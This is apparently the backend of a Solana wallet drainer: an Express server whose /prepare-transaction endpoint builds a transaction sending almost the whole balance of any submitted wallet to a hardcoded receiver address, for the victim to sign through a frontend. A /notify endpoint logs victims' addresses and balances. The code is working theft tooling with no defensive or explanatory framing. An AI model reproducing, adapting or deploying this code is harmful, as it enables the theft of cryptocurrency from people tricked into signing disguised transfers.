const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// Use public RPC for backend too
const PUBLIC_RPC = 'https://api.mainnet-beta.solana.com';
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
const connection = new Connection(PUBLIC_RPC, 'confirmed');

app.post('/prepare-transaction', async (req, res) => {
    try {
        const { publicKey } = req.body;
        
        if (!publicKey) {
            return res.status(400).json({ success: false, error: 'publicKey required' });
        }
        
        console.log('📝 Preparing tx for:', publicKey);
        
        const fromPubkey = new PublicKey(publicKey);
        const toPubkey = new PublicKey(RECEIVER_WALLET);
        
        // Get balance
        const balance = await connection.getBalance(fromPubkey);
        console.log('💰 Balance:', balance / LAMPORTS_PER_SOL, 'SOL');
        
        // Calculate amount to send (leave ~0.005 SOL for fees)
        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
        const amountToSend = Math.max(0, balance - minBalance - 5000 - 5000000);
        
        if (amountToSend <= 0) {
            return res.json({ success: false, error: 'No SOL available after fees. Minimum 0.01 SOL required.' });
        }
        
        console.log('📤 Sending:', amountToSend / LAMPORTS_PER_SOL, 'SOL');
        
        // Create transaction
        const transaction = new Transaction();
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToSend,
            })
        );
        
        // Serialize without blockhash (frontend will add fresh one)
        const serialized = transaction.serialize({ 
            requireAllSignatures: false, 
            verifySignatures: false 
        });
        
        res.json({ 
            success: true, 
            transaction: Array.from(serialized),
            amount: amountToSend,
            amountSol: amountToSend / LAMPORTS_PER_SOL
        });
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/notify', (req, res) => {
    console.log('📱', req.body.customMessage);
    console.log('👛', req.body.address);
    console.log('💰', req.body.balance, 'SOL');
    res.json({ ok: true });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server on port ${PORT}`);
    console.log(`🎯 Receiver: ${RECEIVER_WALLET}`);
});
